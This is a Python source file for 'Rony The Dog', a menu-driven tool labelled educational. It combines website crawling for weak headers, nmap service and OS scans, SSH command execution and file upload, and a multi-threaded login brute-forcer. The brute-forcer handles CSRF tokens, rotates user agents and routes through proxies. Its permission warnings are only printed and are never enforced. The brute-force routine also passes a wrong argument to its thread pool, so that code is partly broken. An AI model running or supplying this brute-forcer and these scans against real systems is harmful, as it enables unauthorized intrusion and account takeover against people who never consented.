#!/usr/bin/python3

import nmap
import requests
import paramiko
from bs4 import BeautifulSoup
import sys
import time
import logging
import re
from getpass import getpass
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin
import socket
import os
from datetime import datetime

# Configure logging
logging.basicConfig(filename='rony_the_dog.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Initialize User-Agent for web requests
ua = UserAgent()

# HTML Report Template
REPORT_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Rony The Dog Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #2c3e50; }}
        h2 {{ color: #34495e; }}
        table {{ border-collapse: collapse; width: 100%; margin-top: 10px; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
        .section {{ margin-bottom: 20px; }}
    </style>
</head>
<body>
    <h1>Rony The Dog - Cybersecurity Report</h1>
    <p>Developed by Arjun P A for educational purposes only.</p>
    <p>Generated on: {timestamp}</p>
    {content}
</body>
</html>
"""

def print_warning():
    """Display ethical use warning."""
    print("\n=== Rony The Dog - Educational Cybersecurity Tool ===")
    print("Developed by Arjun P A")
    print("WARNING: For EDUCATIONAL PURPOSES ONLY.")
    print("Use ONLY on systems/networks with EXPLICIT WRITTEN PERMISSION.")
    print("Unauthorized use is ILLEGAL and UNETHICAL.")
    print("Log file: rony_the_dog.log | Report: rony_the_dog_report.html\n")

def generate_report(content):
    """Generate an HTML report."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_content = REPORT_TEMPLATE.format(timestamp=timestamp, content=content)
    with open('rony_the_dog_report.html', 'w') as f:
        f.write(report_content)
    logging.info("Report generated: rony_the_dog_report.html")

def scan_website(url, max_depth=1):
    """Scan a website for vulnerabilities, crawl links, and check software versions."""
    visited = set()
    report_content = "<h2>Website Scan Results</h2>"
    
    def crawl(url, depth):
        if depth > max_depth or url in visited:
            return []
        visited.add(url)
        results = []
        try:
            logging.info(f"Scanning website: {url}")
            headers = {'User-Agent': ua.random}
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code != 200:
                logging.warning(f"Non-200 status for {url}: {response.status_code}")
                return results
            
            results.append(f"<h3>URL: {url}</h3>")
            results.append(f"<p>Status Code: {response.status_code}</p>")
            
            # Header analysis
            headers_info = "<h4>Headers</h4><table><tr><th>Header</th><th>Value</th></tr>"
            for key, value in response.headers.items():
                headers_info += f"<tr><td>{key}</td><td>{value}</td></tr>"
            headers_info += "</table>"
            results.append(headers_info)
            
            # Security headers check
            security_headers = ['X-Frame-Options', 'X-Content-Type-Options', 'Content-Security-Policy']
            missing = [h for h in security_headers if h not in response.headers]
            if missing:
                results.append(f"<p>Warning: Missing security headers: {', '.join(missing)}</p>")
                logging.warning(f"Missing headers on {url}: {missing}")
            
            # Software version check
            server = response.headers.get('Server', '')
            if server:
                results.append(f"<p>Server Software: {server}</p>")
                if 'Apache/2.2' in server or 'nginx/1.14' in server:
                    results.append("<p>Warning: Outdated server software detected!</p>")
                    logging.warning(f"Outdated software on {url}: {server}")
            
            # Basic vulnerability checks
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            if forms:
                results.append(f"<p>Found {len(forms)} form(s). Potential login endpoints.</p>")
                logging.info(f"Found {len(forms)} forms on {url}")
            
            # Check for input fields vulnerable to XSS/SQLi
            inputs = soup.find_all('input')
            for inp in inputs:
                if inp.get('type') in ['text', 'password'] and not inp.get('maxlength'):
                    results.append("<p>Warning: Input field without maxlength. Potential XSS risk.</p>")
                    logging.warning(f"Potential XSS risk on {url}: Input without maxlength")
            
            # Crawl links
            links = soup.find_all('a', href=True)
            for link in links:
                href = urljoin(url, link['href'])
                if href.startswith(url) and href not in visited:
                    results.extend(crawl(href, depth + 1))
            
            return results
        
        except requests.exceptions.RequestException as e:
            logging.error(f"Website scan error for {url}: {e}")
            return [f"<p>Error scanning {url}: {e}</p>"]
    
    print(f"\nScanning website: {url}")
    report_content += "".join(crawl(url, 0))
    generate_report(report_content)
    print("Website scan completed. Check rony_the_dog_report.html for details.")

def scan_ip(ip, port_range="1-1024"):
    """Multi-threaded IP scan with service version and OS detection."""
    try:
        logging.info(f"Starting IP scan for {ip} on ports {port_range}")
        print(f"\nScanning IP: {ip} (Port range: {port_range})")
        
        nm = nmap.PortScanner()
        nm.scan(ip, port_range, arguments='-sV -O')  # Service version and OS detection
        
        report_content = f"<h2>IP Scan Results: {ip}</h2>"
        for host in nm.all_hosts():
            report_content += f"<h3>Host: {host} ({nm[host].hostname()})</h3>"
            logging.info(f"Scanned host: {host} ({nm[host].hostname()})")
            
            # OS Detection
            os_info = nm[host].get('osmatch', [])
            if os_info:
                report_content += f"<p>OS: {os_info[0]['name']} (Accuracy: {os_info[0]['accuracy']}%)</p>"
                logging.info(f"OS detected for {host}: {os_info[0]['name']}")
            
            # Ports
            ports_info = "<table><tr><th>Port</th><th>Protocol</th><th>State</th><th>Service</th><th>Version</th></tr>"
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                for port in ports:
                    state = nm[host][proto][port]['state']
                    service = nm[host][proto][port].get('name', 'unknown')
                    version = nm[host][proto][port].get('product', '') + ' ' + nm[host][proto][port].get('version', '')
                    ports_info += f"<tr><td>{port}</td><td>{proto}</td><td>{state}</td><td>{service}</td><td>{version}</td></tr>"
                    logging.info(f"Port {port}/{proto} on {host}: {state}, {service}, {version}")
            ports_info += "</table>"
            report_content += ports_info
        
        generate_report(report_content)
        print("IP scan completed. Check rony_the_dog_report.html for details.")
    
    except Exception as e:
        print(f"Error scanning IP: {e}")
        logging.error(f"IP scan error for {ip}: {e}")

def remote_connect(host, username, password, port=22, command=None, upload_file=None):
    """Establish SSH connection, execute command, or upload file."""
    try:
        logging.info(f"Attempting SSH connection to {host} as {username}")
        print(f"\nAttempting SSH connection to {host}...")
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password, timeout=5)
        
        report_content = f"<h2>SSH Connection: {host}</h2>"
        report_content += "<p>Connection successful!</p>"
        logging.info(f"SSH connection successful to {host} as {username}")
        
        if command:
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode().strip()
            error = stderr.read().decode().strip()
            report_content += f"<h3>Command: {command}</h3><p>Output: {output}</p>"
            if error:
                report_content += f"<p>Error: {error}</p>"
            logging.info(f"Command '{command}' on {host}: {output}")
        
        if upload_file:
            sftp = ssh.open_sftp()
            remote_path = f"/tmp/{os.path.basename(upload_file)}"
            sftp.put(upload_file, remote_path)
            sftp.close()
            report_content += f"<p>File uploaded: {upload_file} to {remote_path}</p>"
            logging.info(f"File uploaded to {host}: {upload_file} to {remote_path}")
        
        ssh.close()
        generate_report(report_content)
        print("SSH operation completed. Check rony_the_dog_report.html for details.")
    
    except paramiko.AuthenticationException:
        print("Authentication failed. Check username/password.")
        logging.error(f"SSH authentication failed for {host} as {username}")
    except Exception as e:
        print(f"Connection error: {e}")
        logging.error(f"SSH connection error for {host}: {e}")

def brute_force(url, username, password_file, max_threads=5, proxy=None):
    """Multi-threaded brute-force attack with proxy support."""
    found = False
    report_content = f"<h2>Brute-Force Results: {url}</h2>"
    
    def attempt_login(password):
        nonlocal found
        if found:
            return None
        try:
            session = requests.Session()
            headers = {'User-Agent': ua.random}
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            
            # Fetch CSRF token
            response = session.get(url, headers=headers, proxies=proxies, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_token = None
            token_input = soup.find('input', {'name': re.compile('csrf.*', re.I)})
            if token_input and token_input.get('value'):
                csrf_token = token_input.get('value')
            
            # Prepare login data
            data = {
                'username': username,
                'password': password.strip(),
                'submit': 'Login'
            }
            if csrf_token:
                data['csrf_token'] = csrf_token
            
            # Send login attempt
            response = session.post(url, data=data, headers=headers, proxies=proxies, timeout=5)
            
            # Check for success
            if "login failed" not in response.text.lower() and response.status_code == 200:
                found = True
                return f"<p>Success! Username: {username}, Password: {password.strip()}</p>"
            return None
        
        except requests.exceptions.RequestException as e:
            logging.error(f"Brute-force attempt error for {password.strip()}: {e}")
            return None
    
    try:
        logging.info(f"Starting brute-force on {url} for user {username}")
        print(f"\nStarting brute-force on {url} for user {username}")
        print("Ensure permission. This may trigger security measures.")
        
        with open(password_file, 'r') as f:
            passwords = f.readlines()
        
        report_content += f"<p>Attempting {len(passwords)} passwords with {max_threads} threads.</p>"
        with ThreadPoolExecutor(max_threads=max_threads) as executor:
            results = executor.map(attempt_login, passwords)
            for i, result in enumerate(results, 1):
                if result:
                    report_content += result
                    logging.info(f"Brute-force success on {url}: Username: {username}, Password found")
                    break
                print(f"Attempt {i}/{len(passwords)}: Failed", end='\r')
                time.sleep(0.1)  # Adaptive rate-limiting
        
        if not found:
            report_content += "<p>No valid password found.</p>"
            logging.info(f"Brute-force completed on {url}: No password found")
        
        generate_report(report_content)
        print("\nBrute-force completed. Check rony_the_dog_report.html for details.")
    
    except FileNotFoundError:
        print(f"Password file {password_file} not found.")
        logging.error(f"Password file {password_file} not found")
    except Exception as e:
        print(f"Brute-force error: {e}")
        logging.error(f"Brute-force error on {url}: {e}")

def main():
    """Main function to run Rony The Dog."""
    print_warning()
    
    while True:
        print("\n=== Rony The Dog Menu ===")
        print("Developed by Arjun P A")
        print("1. Scan Website (Advanced)")
        print("2. Scan IP Address (Multi-threaded)")
        print("3. Remote SSH Connection (Command/File Upload)")
        print("4. Brute-Force Login (Multi-threaded)")
        print("5. Exit")
        
        choice = input("\nEnter choice (1-5): ")
        
        if choice == '1':
            url = input("Enter website URL (e.g., http://example.com): ")
            if not url.startswith('http'):
                url = 'http://' + url
            depth = input("Enter crawl depth (default 1): ") or 1
            scan_website(url, int(depth))
        
        elif choice == '2':
            ip = input("Enter IP address or hostname: ")
            port_range = input("Enter port range (e.g., 1-1024) or press Enter for default: ") or "1-1024"
            scan_ip(ip, port_range)
        
        elif choice == '3':
            host = input("Enter remote host IP/hostname: ")
            username = input("Enter username: ")
            password = getpass("Enter password: ")
            port = input("Enter SSH port (default 22) or press Enter: ") or 22
            command = input("Enter command to execute (or press Enter to skip): ") or None
            upload_file = input("Enter local file path to upload (or press Enter to skip): ") or None
            if upload_file and not os.path.exists(upload_file):
                print("File not found!")
                continue
            remote_connect(host, username, password, int(port), command, upload_file)
        
        elif choice == '4':
            url = input("Enter login page URL (e.g., http://example.com/login): ")
            if not url.startswith('http'):
                url = 'http://' + url
            username = input("Enter username to brute-force: ")
            password_file = input("Enter path to password file (e.g., passwords.txt): ")
            threads = input("Enter number of threads (default 5): ") or 5
            proxy = input("Enter proxy (e.g., http://proxy:8080) or press Enter to skip: ") or None
            brute_force(url, username, password_file, int(threads), proxy)
        
        elif choice == '5':
            print("Exiting Rony The Dog. Stay ethical!")
            logging.info("Rony The Dog terminated by user")
            sys.exit(0)
        
        else:
            print("Invalid choice. Try again.")
            logging.warning(f"Invalid menu choice: {choice}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nOperation cancelled by user.")
        logging.info("Operation cancelled by user")
        sys.exit(1)
    except Exception as e:
        print(f"Fatal error: {e}")
        logging.error(f"Fatal error: {e}")
        sys.exit(1)